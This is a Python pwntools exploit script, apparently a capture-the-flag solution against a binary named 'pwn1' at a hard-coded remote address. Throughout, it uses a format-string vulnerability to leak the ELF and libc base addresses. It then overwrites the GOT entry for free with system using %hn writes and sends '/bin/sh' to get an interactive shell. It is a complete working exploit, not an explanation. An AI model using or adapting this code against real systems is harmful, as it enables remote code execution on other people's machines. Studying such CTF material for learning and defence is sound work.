#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn1'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 50152

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def fun1(data):
	sla('Code:\n', '1')
	sa('2017:', data)

def fun2(data):
	sla('Code:\n', '2')
	sa('Name:\n', data)

#--------------------------Exploit--------------------------
def exploit():
	# leak elf base
	leak_offset = 402
	p = 'A' * 0x3e8
	p += 'AA' + '%' + str(leak_offset) + '$p' # AA for ajust
	fun1(p)

	ru('0x')
	elf_base = int(r(12), 16) - (0x555555554c3c - 0x555555554000)
	li('elf_base ' + hex(elf_base))
	free_got = elf_base + exe.got['free']
	li('free_got ' + hex(free_got))

	# leak libc
	leak_offset = 398
	p = 'A' * 0x3e8
	p += 'AA' + '%' + str(leak_offset) + '$p' # AA for ajust
	fun1(p)
	ru('0x')
	lib.address = int(r(12), 16) - lib.sym['__libc_start_main'] - 240
	li('libc_base ' + hex(lib.address))

	# for set got table
	fun2('A')


	#(0x7fffffffd850 - 0x7fffffffd470) / 8= 0x7C

	li('system ' + hex(lib.sym['system']))

	sys_0 = lib.sym['system'] & 0xFFFF
	sys_1 = (lib.sym['system'] & 0xFF0000) >> (8 * 2)

	li('sys_0 ' + hex(sys_0))
	li('sys_1 ' + hex(sys_1))

	offset = 0x7C  + 9
	p = 'A' * 0x3e8 + 'AA' # for alignment
	p += '%' +  str(sys_0 - len(p) - 0x14)
	p += 'c%' + str(offset + 1) + '$hn'
	p += p64(free_got)
	fun1(p)

	offset = 0x7C  + 9
	p = 'A' * 0x3e8 + 'AA' # for alignment

	p2 = str(sys_1 + 2)
	p2 = p2.rjust(4, '0')

	p += '%' + p2
	p += 'c%' + str(offset + 1) + '$hhn'
	p += p64(free_got + 2)
	fun1(p)

	#db()

	fun2('/bin/sh\x00')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
